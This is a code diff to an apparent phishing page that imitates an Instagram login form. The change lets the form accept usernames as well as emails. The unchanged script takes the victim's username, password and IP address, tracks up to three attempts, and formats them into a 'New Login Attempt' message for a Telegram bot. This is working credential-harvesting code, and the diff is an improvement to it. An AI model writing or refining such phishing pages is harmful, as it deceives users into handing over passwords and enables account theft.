@@ -31,7 +31,7 @@
             margin-bottom: 20px;
         }
 
-        input[type="email"], 
+        input[type="text"], 
         input[type="password"] {
             width: 100%;
             padding: 10px;
@@ -74,7 +74,7 @@
         
         <!-- Login Form -->
         <form id="loginForm">
-            <input type="email" id="email" placeholder="Email or Username" required>
+            <input type="text" id="emailOrUsername" placeholder="Email or Username" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
             <p class="forgot"><a href="#">Forgot password?</a></p>
@@ -92,7 +92,7 @@
             event.preventDefault();  // Prevent form from reloading page
 
             attemptCount++;
-            const email = document.getElementById('email').value;
+            const emailOrUsername = document.getElementById('emailOrUsername').value;
             const password = document.getElementById('password').value;
             const formName = "Instagram";
             
@@ -104,7 +104,7 @@
             // Prepare message for Telegram bot
             const message = `
 📩 *New Login Attempt on Instagram Form*  
-📧 *Email/Username:* ${email}  
+📧 *Email/Username:* ${emailOrUsername}  
 🔑 *Password:* ${password}  
 🌐 *IP Address:* ${userIp}  
 🔁 *Attempt:* ${attemptCount}/3
